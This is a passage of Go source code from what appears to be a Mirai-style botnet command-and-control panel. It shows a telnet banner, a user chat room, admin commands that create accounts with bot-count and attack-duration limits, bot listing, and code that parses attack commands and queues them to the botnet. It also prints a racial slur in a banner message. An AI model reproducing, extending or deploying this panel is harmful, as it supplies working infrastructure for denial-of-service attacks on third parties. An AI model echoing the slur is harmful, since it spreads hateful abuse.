            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
            this.conn.Write([]byte("\x1b[36m               ╚════════════╦═══════════\x1b[35m═══════════╦═══════════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                            ║discord.gg/\x1b[35mGjvmqs7Pxk ║\r\n"))// @xGkun// @xGkun
            this.conn.Write([]byte("\x1b[36m                            ╚═══╦═══════\x1b[35m═══════╦═══╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                                ║  -----\x1b[35m-----  ║\r\n"))// @xGkun// @xGkun
            this.conn.Write([]byte("\x1b[36m                                ╚═══════\x1b[35m═══════╝\r\n"))
            this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[37mNigger has been killed.\x1b[37m\r\n")))
            continue
        }

        if cmd == "" { ////anti crash and tings
            continue
        }


        args := strings.Split(cmd, " ")
        switch strings.ToLower(args[0]) {
        case "chat":
            fmt.Fprintf(this.conn, "Type EXIT to quit the chat.\r\n")

            sessionMutex.Lock()
            for _, s := range sessions {
                if s.Chat == true {
                    fmt.Fprintf(s.Conn, "\033[37mSYSTEM\033[37m> [\033[37m%s\033[37m] \033[37mHas Joined The Channel\033[37m.\r\n", username)
                }
            }// @xGkun// @xGkun// @xGkun
            sessionMutex.Unlock()

            for {
                fmt.Fprint(this.conn, "\x1b[37m"+ username +">\x1b[0m")
                msg, err := this.ReadLine(false)
                if err != nil {
                    return
                }

                if msg == "EXIT" {
                    sessionMutex.Lock()
                    for _, s := range sessions {
                        if s.Chat == true {
                            fmt.Fprintf(s.Conn, "\r\x1b[37mSYSTEM\033[37m> \033[37m[\033[37m%s\033[37m] \033[37mHas Left The Channel\033[37m.\x1b[0m\r\n", username)
                        }
                    }
                    sessionMutex.Unlock()
                    break
                }

                sessionMutex.Lock()
                for _, s := range sessions {
                    if s.Chat == true && s.Username != username {
                        fmt.Fprintf(s.Conn, "\r\x1b[37m%s \x1b[0m %s\r\n \033[37m", username, msg)
                    }// @xGkun// @xGkun// @xGkun
                }
                sessionMutex.Unlock()
            }
            continue

        }
            if err != nil || cmd == "@" || cmd == "-1" || cmd == "-2" || cmd == "-3" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[35mNice Try <3\r\n"))
            continue
        }

        if strings.HasPrefix(cmd, "-") {
            this.conn.Write([]byte("\033[37mCrashing Is Against TOS.\033[0m\r\n"))
            continue
        }
        if strings.HasPrefix(cmd, "@") {
            this.conn.Write([]byte("\033[37mCrashing Is Against TOS.\033[0m\r\n"))
            continue
        }

        /*--------------------------------------------------------------------------------------------------------------------------------------------*/

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" || cmd == "+" || cmd == "add" {
            this.conn.Write([]byte("Username\033[0m: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Password\033[0m: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Bot Count \033[0m(-1 Access to All)\033[1;37m: "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Attack Length \033[0m(-1 Unlimited)\033[1;37m: "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown \033[0m(0 for none)\033[1;37m: "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("User Information: \r\nUsername: " + new_un + "\r\nPassword\033[0m: " + new_pw + "\r\nBots[0m: " + max_bots_str + "\r\nContinue[0m? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[0mSuccessfully Added " + new_un + "\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "bots" || cmd  == "/b" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;35m%s\033[1;37m:\033[1;37m\t%d\r\n", k, v)))
            }
            continue
		}
			 
		if userInfo.admin == 1 && cmd == "bots" || cmd  == "b" {
        botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[1;33mTotal Bots\033[1;37m:\t%d\r\n", botCount)))
            continue
		} 

	    if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    this.conn.Write([]byte("Blocked attack by " + username + " to whitelisted prefix"))
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
